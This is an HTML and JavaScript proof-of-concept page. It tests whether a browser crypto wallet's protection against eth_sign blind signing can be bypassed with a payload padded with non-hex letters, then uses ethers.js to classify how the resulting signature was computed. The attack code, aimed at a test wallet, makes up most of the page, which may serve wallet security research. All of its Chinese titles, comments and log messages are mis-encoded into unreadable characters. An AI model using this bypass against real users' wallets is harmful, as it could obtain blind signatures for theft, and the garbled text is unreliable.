<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>é Hex å­—ç¬¦è§£æå™¨ç»•è¿‡ä¸åº•å±‚çœŸä¼ªé‰´å®š</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.11.1/ethers.umd.min.js"></script>
    <style>
        body { font-family: monospace; max-width: 900px; margin: 20px auto; padding: 25px; background-color: #f8f9fa; color: #333; }
        h2 { color: #212529; border-bottom: 2px solid #dee2e6; padding-bottom: 10px; }
        button { padding: 12px 24px; margin: 10px 10px 10px 0; cursor: pointer; background-color: #0d6efd; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 15px;}
        button.exploit { background-color: #dc3545; }
        button:disabled { background-color: #adb5bd; cursor: not-allowed; }
        #console { background: #212529; color: #20c997; padding: 20px; border-radius: 8px; height: 450px; overflow-y: auto; white-space: pre-wrap; font-size: 14px; border: 1px solid #495057; line-height: 1.6;}
        .highlight { color: #ffc107; font-weight: bold; }
        .danger-text { color: #ff4d4d; font-weight: bold; }
        .safe-text { color: #0dcaf0; font-weight: bold; }
    </style>
</head>
<body>
    <h2>éæ³•å­—ç¬¦ç»•è¿‡ä¸åº•å±‚è¡Œä¸ºå…¨è‡ªåŠ¨é‰´å®š</h2>
    <div style="margin-bottom: 20px; font-size: 14px; color: #6c757d;">
        <b>æ ¸å¿ƒé€»è¾‘ï¼š</b> é‡‡ç”¨å·²éªŒè¯å¯å‡»ç©¿é˜²ç«å¢™çš„é Hex å­—ç¬¦ä¸²å”¤èµ· UIï¼Œéšåè¿›è¡Œåº•å±‚å¯†ç å­¦è§£æã€‚
    </div>

    <div>
        <button id="btnConnect">1. è¿æ¥æµ‹è¯•é’±åŒ…</button>
        å½“å‰åœ°å€: <span id="walletAddress" style="font-weight: bold; color: #0d6efd;">æœªè¿æ¥</span>
    </div>

    <div style="margin-top: 20px; padding-top: 20px; border-top: 1px dashed #ced4da;">
        <button id="btnBypass" class="exploit" disabled>2. å‘é€ç»•è¿‡ Payload å¹¶é‰´å®šçœŸä¼ª</button>
    </div>

    <h3 style="margin-top: 30px; color: #495057;">æ·±åº¦é€†å‘éªŒè¯æ§åˆ¶å°:</h3>
    <div id="console">ç­‰å¾…æ“ä½œ...</div>

    <script>
        const btnConnect = document.getElementById('btnConnect');
        const btnBypass = document.getElementById('btnBypass');
        const elAddress = document.getElementById('walletAddress');
        const elConsole = document.getElementById('console');
        let currentAccount = null;

        function log(msg) {
            elConsole.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
            elConsole.scrollTop = elConsole.scrollHeight;
        }

        btnConnect.addEventListener('click', async () => {
            if (window.ethereum) {
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    currentAccount = accounts[0]; 
                    elAddress.innerText = currentAccount;
                    log(`âœ… é’±åŒ…è¿æ¥æˆåŠŸã€‚`);
                    btnBypass.disabled = false;
                } catch (e) { log(`âŒ è¿æ¥å¤±è´¥: ${e.message}`); }
            }
        });

        btnBypass.addEventListener('click', async () => {
            if (!currentAccount) return;
            
            // æ ¸å¿ƒï¼šå¤åˆ»ä½ æˆåŠŸç»•è¿‡çš„é‚£æ¡ Payloadï¼ˆåŒ…å«éåå…­è¿›åˆ¶å­—æ¯ï¼‰
            const bypassPayload = "0x11223344Some_evil_content"; 
            
            log(`\n<span class="highlight">--- ğŸš€ é˜¶æ®µ 1ï¼šåˆ©ç”¨é Hex å­—ç¬¦å‡»ç©¿é˜²ç«å¢™ ---</span>`);
            log(`å‘é€ç•¸å½¢æ•°æ®: ${bypassPayload}`);
            
            try {
                const signature = await window.ethereum.request({
                    method: 'eth_sign',
                    params: [currentAccount, bypassPayload]
                });
                
                log(`\n<span class="danger-text">ğŸš¨ [çªç ´é˜²çº¿] é’±åŒ…æœªèƒ½æ‹¦æˆªï¼æˆåŠŸæ‹¿åˆ°ç­¾å:</span>\n${signature}`);
                log(`\n<span class="highlight">--- ğŸ” é˜¶æ®µ 2ï¼šæ‰§è¡Œåº•å±‚ç­¾åçœŸä¼ªå¯†ç å­¦åæ¨ ---</span>`);
                
                verifyDeepLogic(bypassPayload, signature, currentAccount.toLowerCase());

            } catch (error) {
                log(`ğŸ›¡ï¸ è¯·æ±‚è¢«æ‹¦æˆª: ${error.message}`);
            }
        });

        // æ ¸å¿ƒéªŒè¯å¼•æ“
        function verifyDeepLogic(payload, signature, addressLowerCase) {
            if (typeof ethers === 'undefined') return;
            let foundMatch = false;

            // éªŒè¯ 1ï¼šå®‰å…¨çš„ä¼ªè£… (å°†åŒ…å«å­—æ¯çš„æ•°æ®è§†ä¸ºçº¯æ–‡æœ¬ï¼Œå¹¶åŠ ä¸Š EIP-191 å‰ç¼€)
            try {
                if (ethers.verifyMessage(payload, signature).toLowerCase() === addressLowerCase) {
                    log(`\n<span class="safe-text">ğŸ›¡ï¸ [å®‰å…¨ä¼ªè£…] é‰´å®šç»“æœï¼šå·²è¢«å®‰å…¨è½¬æ¢ä¸º personal_signã€‚</span>`);
                    log(`åŸç†è§£æï¼šå¤–å±‚é˜²ç«å¢™è¢«å­—æ¯éª—è¿‡ï¼Œä½†åº•å±‚åº“æŠŠå®ƒå½“æˆäº†æ™®é€šæ–‡æœ¬ï¼Œè€è€å®å®åŠ ä¸Šäº† \\x19Ethereum... å‰ç¼€ã€‚è¯¥ç­¾åæ— æ³•ç”¨ä½œæ¶æ„äº¤æ˜“ã€‚`);
                    foundMatch = true;
                }
            } catch(e) {}

            // éªŒè¯ 2ï¼šä¸­å±è£¸ç­¾ (ç›´æ¥å°†åŒ…å«å­—æ¯çš„æ•°æ®è½¬æˆ UTF-8 å­—èŠ‚å¹¶ Keccak256 å“ˆå¸Œåç›²ç­¾)
            if (!foundMatch) {
                try {
                    const utf8Bytes = ethers.toUtf8Bytes(payload);
                    const hash = ethers.keccak256(utf8Bytes);
                    if (ethers.recoverAddress(hash, signature).toLowerCase() === addressLowerCase) {
                        log(`\n<span class="highlight">âš ï¸ [ä¸­å±æ¼æ´] é‰´å®šç»“æœï¼šæ–‡æœ¬è½¬ç è£¸ç­¾ï¼</span>`);
                        log(`åŸç†è§£æï¼šé’±åŒ…åº•å±‚å°†è¿™ä¸²å­—ç¬¦å¼ºè¡Œè½¬æ¢æˆäº†å­—èŠ‚åºåˆ—å¹¶å“ˆå¸Œè£¸ç­¾ã€‚è™½ç„¶æ˜¯ eth_signï¼Œä½†æ”»å‡»è€…æéš¾é€šè¿‡è¿™ç§å¸¦å­—æ¯çš„æ ¼å¼æ‹¼å‡‘å‡ºåˆæ³•çš„ä»¥å¤ªåŠäº¤æ˜“ã€‚`);
                        foundMatch = true;
                    }
                } catch(e) {}
            }

            // éªŒè¯ 3ï¼šæåº¦è‡´å‘½çš„å‰”é™¤è£¸ç­¾ (è¿‡æ»¤æ‰æ‰€æœ‰é Hex å­—ç¬¦åï¼Œå¯¹å‰©ä¸‹çš„å­—ç¬¦è£¸ç­¾)
            if (!foundMatch) {
                try {
                    // ä» "0x11223344Some_evil_content" æå–åˆæ³•çš„ hex å­—ç¬¦: 0x11223344eece
                    const strippedHex = "0x11223344eece";
                    const hash = ethers.keccak256(strippedHex); // æˆ–ç›´æ¥ zeroPad åˆ° 32 bytes
                    
                    if (ethers.recoverAddress(hash, signature).toLowerCase() === addressLowerCase || 
                        ethers.recoverAddress(ethers.zeroPadValue(strippedHex, 32), signature).toLowerCase() === addressLowerCase) {
                        log(`\n<span class="danger-text">â˜ ï¸ [æåº¦è‡´å‘½] é‰´å®šç»“æœï¼šåº•å±‚å‰”é™¤äº†éæ³•å­—ç¬¦å¹¶æ‰§è¡Œäº†è£¸ç­¾ï¼</span>`);
                        log(`åŸç†è§£æï¼šå¤–å±‚é˜²ç«å¢™è¢«å­—æ¯éª—è¿‡ï¼Œè€Œåº•å±‚åº“è‡ªä½œèªæ˜åœ°åˆ æ‰äº†å­—æ¯ï¼Œåªå¯¹å‰©ä¸‹çš„ Hex è¿›è¡Œäº†ç›²ç­¾ï¼è¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥éšæ„æ„é€ æ¶æ„äº¤æ˜“ï¼Œåªéœ€åœ¨é‡Œé¢æºæ‚å­—æ¯å°±èƒ½å®Œç¾å‡»æ€ã€‚`);
                        foundMatch = true;
                    }
                } catch(e) {}
            }

            if (!foundMatch) {
                log(`\nâ“ [è¯¡å¼‚é€»è¾‘] ä¾ç„¶æ— æ³•åæ¨å‡ºåº•å±‚çš„åŠ å¯†å¤„ç†é€»è¾‘ã€‚åº•å±‚çš„ C++/Rust åº“å¯èƒ½å¯¹è¿™æ®µç•¸å½¢æ•°æ®å‘ç”Ÿäº†æ„æ–™ä¹‹å¤–çš„å†…å­˜æˆªæ–­ã€‚`);
            }
        }
    </script>
</body>
</html>
